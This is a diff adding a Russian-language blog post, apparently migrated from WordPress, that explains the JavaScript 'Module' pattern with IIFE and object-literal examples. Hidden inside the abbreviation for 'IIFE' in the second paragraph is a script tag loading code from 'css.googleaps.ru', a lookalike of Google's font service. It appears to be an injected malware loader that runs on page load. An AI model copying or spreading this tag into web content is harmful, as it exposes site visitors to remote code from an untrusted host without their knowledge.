@@ -1,0 +1,79 @@
+---
+layout: post
+status: publish
+published: true
+title: Паттерн &laquo;Модуль&raquo;
+author:
+  display_name: Maxyc Webber
+  login: admin
+  email: maxycws@gmail.com
+  url: ''
+author_login: admin
+author_email: maxycws@gmail.com
+wordpress_id: 1442
+wordpress_url: http://magazine.loc/verstka/%d0%bf%d0%b0%d1%82%d1%82%d0%b5%d1%80%d0%bd-%d0%bc%d0%be%d0%b4%d1%83%d0%bb%d1%8c/
+date: '2015-06-14 09:52:24 +0200'
+date_gmt: '2015-06-14 09:52:24 +0200'
+categories:
+- Верстка
+tags:
+- ip
+- javascript
+- git
+- api
+- forwebdev
+comments: []
+---
+<p>&laquo;Модуль&raquo;&nbsp;&mdash; это популярный паттерн проектирования, задача которого заключается в&nbsp;изоляции части логики приложения от&nbsp;глобального контекста для избегания конфликтов и&nbsp;ошибок. Модуль представляет собой в&nbsp;идеале независимый компонент, решающий одну небольшую задачу. Внутри модуля может быть сложная логика, но&nbsp;его цель&nbsp;&mdash; скрыть её от&nbsp;нас и&nbsp;предоставить нам простой и&nbsp;понятный <acronym title="Application programming interface">API<&#47;acronym>.<&#47;p></p>
+<p>В&nbsp;языке JavaScript нет разделения на&nbsp;публичные, защищённые и&nbsp;приватные переменные. Но&nbsp;мы&nbsp;можем добиться псевдоприватности с&nbsp;помощью замыканий. Распространённая реализация &laquo;модуля&raquo; использует немедленно вызываемую функцию (<abbr title="Immediately invoked function expression">IIFE<script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script><&#47;abbr>) для скрытия внутренних переменных и&nbsp;функций. Давайте рассмотрим реализацию этого паттерна на&nbsp;примере списка тегов статьи:<&#47;p></p>
+<pre><code class="language-javascript">var tagList = (function() {<br />
+  &#47;&#47; Приватная переменная, к<br />
+  &#47;&#47; которой получить доступ можно<br />
+  &#47;&#47; только внутри этой функции<br />
+  var tags = [];</p>
+<p>  &#47;&#47; &laquo;модуль&raquo;&nbsp;&mdash; это объект.<br />
+  &#47;&#47; Возвращаемый объект публичен.<br />
+  &#47;&#47; Снаружи мы можем получить доступ ко всем данным из этого объекта<br />
+  return {<br />
+    &#47;&#47; публичные методы<br />
+    getItemsCount: function() {<br />
+      return tags.length;<br />
+    },</p>
+<p>    addItem: function(tag) {<br />
+      tags.push(tag);<br />
+    }<br />
+  }<br />
+})();<&#47;code><&#47;pre></p>
+<p>В&nbsp;данном примере мы&nbsp;создали модуль <code>tagList<&#47;code>, представляющий собой список тегов. Заметьте, что модуль обёрнут в&nbsp;немедленно вызываемую функцию, что позволяет нам изолировать внутренние переменные от&nbsp;внешнего контекста. Внутри модуля мы&nbsp;объявили приватную переменную tags, которой присвоили массив для хранения тегов. Из&nbsp;функции мы&nbsp;возвращаем объект (модуль&nbsp;&mdash; это объект, не&nbsp;забывайте об&nbsp;этом) с&nbsp;публичными методами для работы со&nbsp;списком тегов. Мы&nbsp;объявили два метода&nbsp;&mdash; <code>getItemsCount<&#47;code> для получения количества тегов и&nbsp;<code>addItem<&#47;code> для добавления нового тега в&nbsp;список. Проверим работу модуля:<&#47;p></p>
+<pre><code class="language-javascript">tagList.addItem('JavaScript');<br />
+tagList.addItem('Паттерны проектирования');</p>
+<p>tagList.getItemsCount();<br />
+&#47;&#47; => 2</p>
+<p>tagList.tags;<br />
+&#47;&#47; => undefined<br />
+&#47;&#47; мы не можем получить доступ к приватной переменной<br />
+<&#47;code><&#47;pre></p>
+<p>Как вы&nbsp;видите, модуль прекрасно справляется со&nbsp;своими задачами. Мы&nbsp;получили интерфейс для работы с&nbsp;данными (в&nbsp;нашем случае это список тегов), при этом вся логика и&nbsp;внутренние переменные скрыты от&nbsp;нас.<&#47;p></p>
+<p>Следует отметить, что не&nbsp;всегда возникает необходимость изолирования переменных от&nbsp;внешнего кода. В&nbsp;таком случае вы&nbsp;можете создать модуль с&nbsp;помощью простой литеральной нотации объекта:<&#47;p></p>
+<pre><code class="language-javascript">var myModule = {<br />
+  config: {<br />
+    language: 'ru',<br />
+    isSingle: true<br />
+  },</p>
+<p>  myMethod: function() {<br />
+    &#47;&#47; ...<br />
+  }<br />
+};</p>
+<p>&#47;&#47; Все свойства объекта можно модифицировать извне<br />
+myModule.config.isSingle = false;<br />
+myModule.myMethod();<br />
+<&#47;code><&#47;pre></p>
+<div class="author">
+<div class="author__avatar"><img src="http:&#47;&#47;forwebdev.ru&#47;wp-content&#47;uploads&#47;2015&#47;06&#47;avatar128.png" alt=""><&#47;div></p>
+<div class="author__info">
+<div class="author__name">Андрей Романов<&#47;div></p>
+<div class="author__about">Основатель проекта &laquo;For Web&raquo;, верстальщик&nbsp;&mdash; http:&#47;&#47;andrew-r.github.io<&#47;div><br />
+<&#47;p><&#47;div><br />
+<&#47;div></p>
+<p>Запись <a rel="nofollow" href="http:&#47;&#47;forwebdev.ru&#47;javascript&#47;module-pattern&#47;">Паттерн &laquo;Модуль&raquo;<&#47;a> впервые появилась <a rel="nofollow" href="http:&#47;&#47;forwebdev.ru">For Web<&#47;a>.<&#47;p><br />
+Source: http:&#47;&#47;forwebdev.ru</p>
